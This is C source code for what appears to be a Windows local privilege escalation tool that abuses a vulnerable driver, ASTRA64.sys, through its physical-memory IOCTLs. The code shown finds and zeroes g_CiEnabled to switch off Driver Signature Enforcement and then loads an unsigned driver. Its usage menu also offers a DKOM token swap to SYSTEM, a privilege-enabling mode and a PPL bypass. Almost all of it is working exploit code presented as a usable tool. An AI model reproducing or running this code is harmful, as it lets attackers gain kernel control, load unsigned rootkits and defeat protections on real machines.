static uint64_t find_g_ci_enabled_rva(uintptr_t ci_disk) {
    uint64_t fn_rva = export_rva(ci_disk, "CiInitialize");
    if (!fn_rva) { printf("[-] CiInitialize not found in ci.dll\n"); return 0; }
    printf("[*] CiInitialize RVA = 0x%llX\n", (unsigned long long)fn_rva);

    auto *fn = (const uint8_t *)(ci_disk + fn_rva);

    // First plausible candidate
    for (size_t i = 0; i < 0x2000 - 6; i++) {
        // MOV [RIP+disp32], r32: opcode 89, ModRM = 0x?5 (mod=00, rm=101)
        if (fn[i] != 0x89) continue;
        uint8_t modrm = fn[i+1];
        if ((modrm & 0xC7) != 0x05) continue;

        int32_t disp; memcpy(&disp, fn+i+2, 4);
        uint64_t instr_rva  = fn_rva + i;
        uint64_t target_rva = (uint64_t)((int64_t)(instr_rva + 6) + disp);

        // Must land in a data-ish region: past code (>0x10000) and sane
        if (target_rva < 0x8000 || target_rva > 0x300000) continue;

        // Read disk image at target_rva — should currently be 0 or 1
        uint8_t cur_val = *(uint8_t *)(ci_disk + target_rva);
        printf("[*] Candidate +0x%zX: reg=%02X disp=0x%X → RVA=0x%llX  disk_val=%u\n",
               i, (modrm>>3)&7, (uint32_t)disp,
               (unsigned long long)target_rva, cur_val);

        return target_rva;
    }
    printf("[-] g_CiEnabled pattern not found in CiInitialize\n");
    return 0;
}

static int run_dse(const char *drv_path) {
    printf("\n=== Technique 4: DSE Bypass + Load Driver ===\n");
    printf("[*] Driver to load: %s\n", drv_path);

    KernelCtx k;
    if (!kctx_init(&k)) return 1;

    // ── Find ci.dll kernel base ────────────────────────────────────────────────
    RTL_MODS *mods = get_kernel_modules();
    if (!mods) { printf("[-] NtQSI failed\n"); return 1; }

    uint64_t ci_kbase = get_module_kbase(mods, "ci.dll");
    free(mods);
    if (!ci_kbase) { printf("[-] ci.dll not found in module list\n"); return 1; }
    printf("[+] ci.dll kernel base = 0x%llX\n", (unsigned long long)ci_kbase);

    // ── Load ci.dll disk image ─────────────────────────────────────────────────
    uintptr_t ci_disk = load_image("ci.dll");
    if (!ci_disk) { printf("[-] LoadLibraryEx(ci.dll): %lu\n", GetLastError()); return 1; }

    // ── Find g_CiEnabled RVA ──────────────────────────────────────────────────
    uint64_t gci_rva = find_g_ci_enabled_rva(ci_disk);
    if (!gci_rva) return 1;

    uint64_t gci_va = ci_kbase + gci_rva;
    printf("[+] g_CiEnabled VA = 0x%llX\n", (unsigned long long)gci_va);

    // ── Translate → PA and read current value ──────────────────────────────────
    uint64_t gci_pa = 0;
    if (!virt_to_phys(&k.drv, k.cr3, gci_va, &gci_pa)) {
        printf("[-] virt_to_phys(g_CiEnabled) failed\n"); return 1;
    }
    printf("[+] g_CiEnabled PA = 0x%llX\n", (unsigned long long)gci_pa);

    uint32_t orig_val = 0;
    k.drv.read_u32(gci_pa, &orig_val);
    printf("[+] g_CiEnabled current value = %u (DSE %s)\n",
           orig_val, orig_val ? "ENABLED" : "DISABLED");

    // ── Disable DSE ────────────────────────────────────────────────────────────
    printf("[*] Writing 0 → g_CiEnabled (disabling DSE)...\n");
    uint32_t zero = 0;
    k.drv.write_phys(gci_pa, &zero, 4);

    uint32_t check = 0;
    k.drv.read_u32(gci_pa, &check);
    printf("[+] g_CiEnabled = %u (DSE %s)\n", check, check ? "STILL ENABLED" : "DISABLED");
    if (check != 0) { printf("[-] Write did not take effect\n"); return 1; }

    // ── Load unsigned driver ───────────────────────────────────────────────────
    printf("[*] Loading driver: %s\n", drv_path);
    if (!register_driver(DSE_DRIVER_SVC, drv_path)) {
        printf("[-] Driver registration/start failed: %lu\n", GetLastError());
        // Restore DSE before returning
        k.drv.write_phys(gci_pa, &orig_val, 4);
        printf("[+] DSE restored\n");
        return 1;
    }
    printf("[+] Driver '%s' loaded successfully!\n", DSE_DRIVER_SVC);

    // ── Restore DSE ────────────────────────────────────────────────────────────
    printf("[*] Restoring g_CiEnabled = %u...\n", orig_val);
    k.drv.write_phys(gci_pa, &orig_val, 4);
    k.drv.read_u32(gci_pa, &check);
    printf("[+] g_CiEnabled = %u (DSE %s)\n", check, check ? "ENABLED" : "DISABLED");

    printf("\n[+] DSE bypass complete — driver is running.\n");
    printf("    Stop with:  sc stop %s && sc delete %s\n",
           DSE_DRIVER_SVC, DSE_DRIVER_SVC);
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  main
// ─────────────────────────────────────────────────────────────────────────────
int main(int argc, char **argv) {
    printf("\n  [~] astra64_all — multi-technique LPE via ASTRA64.sys\n");
    printf("      IOCTLs: MAP_PHYS(0x80002008) READ_MSR(0x800020EC)\n");
    printf("              PORT_IO(0x80002028-3C) PCI_READ(0x80002064)\n\n");

    NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                      "NtQuerySystemInformation");

    if (argc >= 2 && _stricmp(argv[1], "priv") == 0) return run_priv();
    if (argc >= 2 && _stricmp(argv[1], "ppl")  == 0) {
        const char *name = (argc >= 3) ? argv[2] : "csrss.exe";
        return run_ppl(name);
    }
    if (argc >= 2 && _stricmp(argv[1], "dse")  == 0) {
        const char *path = (argc >= 3) ? argv[2] : DSE_DRIVER_PATH;
        return run_dse(path);
    }

    // Default: no args or explicit "token"
    if (argc < 2 || _stricmp(argv[1], "token") == 0) return run_token();

    if (_stricmp(argv[1], "help") != 0)
        printf("[!] Unknown mode '%s'\n\n", argv[1]);

    printf("Usage:\n");
    printf("  astra64_all.exe token              -- DKOM token swap -> SYSTEM\n");
    printf("  astra64_all.exe priv               -- Enable all token privileges\n");
    printf("  astra64_all.exe ppl [process.exe]  -- PPL bypass (default: csrss.exe)\n");
    printf("  astra64_all.exe dse [driver.sys]   -- DSE bypass + load driver\n\n");
    return _stricmp(argv[1], "help") == 0 ? 0 : 1;
}
